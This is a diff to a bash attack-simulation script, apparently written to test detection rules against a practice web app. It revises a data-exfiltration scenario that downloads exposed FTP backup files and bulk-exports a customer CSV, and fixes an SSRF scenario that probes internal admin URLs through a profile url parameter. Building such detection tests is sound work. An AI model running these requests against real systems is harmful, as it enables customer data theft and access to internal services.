@@ -101,15 +101,18 @@ scenario_http_flood() {
 }
 
 scenario_data_exfiltration() {
-    blue "[*] Scenario: data_exfiltration — Download FTP files"
-    # Randomize the number of downloads and randomly select files
+    blue "[*] Scenario: data_exfiltration — Recon of /ftp, then the bulk customer export"
+    # Recon: a few small FTP files (trips nothing on its own)
     FILES=("acquisitions.md" "coupons_2013.md.bak" "package.json.bak" "suspicious_errors.yml")
-    NUM_DOWNLOADS=$(( (RANDOM % 15) + 15 ))
+    NUM_DOWNLOADS=$(( (RANDOM % 4) + 3 ))
     for i in $(seq 1 $NUM_DOWNLOADS); do
         FILE="${FILES[$RANDOM % ${#FILES[@]}]}"
         curl -s -o /dev/null -w "GET /ftp/$FILE -> %{http_code} (%{size_download} bytes)\n" \
             "${TARGET}/ftp/$FILE" || true
     done
+    # The theft: one bulk export of about 60 MB (trips data_exfiltration: over 50 MB in one transfer)
+    curl -s -o /dev/null -w "GET /rest/export/customers.csv -> %{http_code} (%{size_download} bytes)\n" \
+        "${TARGET}/rest/export/customers.csv" || true
     green "[+] data_exfiltration complete"
 }
 
@@ -137,8 +140,8 @@ scenario_ssrf() {
         "http://localhost:3000/rest/admin"
     )
     for probe in "${PROBES[@]}"; do
-        curl -s -o /dev/null -w "GET /profile?url=%{url_effective} -> %{http_code}
-"             "${TARGET}/profile?url=${probe}" || true
+        curl -s -o /dev/null -w "GET /profile?url=%{url_effective} -> %{http_code}\n" \
+            "${TARGET}/profile?url=${probe}" || true
     done
     green "[+] ssrf complete"
 }
